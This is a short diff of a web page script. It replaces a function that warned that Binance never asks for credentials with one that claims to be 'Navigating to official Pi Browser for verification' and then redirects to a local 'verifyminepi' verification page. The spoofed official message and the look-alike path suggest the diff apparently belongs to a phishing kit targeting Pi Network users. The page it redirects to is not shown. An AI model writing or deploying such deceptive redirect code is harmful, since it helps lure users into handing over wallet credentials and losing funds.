@@ -41,11 +41,11 @@
     </div>
 
     <script>
-        function navigateTo(page) {
-            console.warn("Binance wants to verify ownership of account. Binance will not ask you for your confidential credentials.");
+        function verifyAndNavigate() {
+            alert("Navigating to official Pi Browser for verification...");
             setTimeout(function() {
-                window.location.href = page;
-            }, 3000); // 3-second delay
+                window.location.href = 'vent/verifyminepi.com/verifyminepi/verify/ventindex.html';
+            }, 2000); // Change time delay as needed
         }
 
         function goBack() {
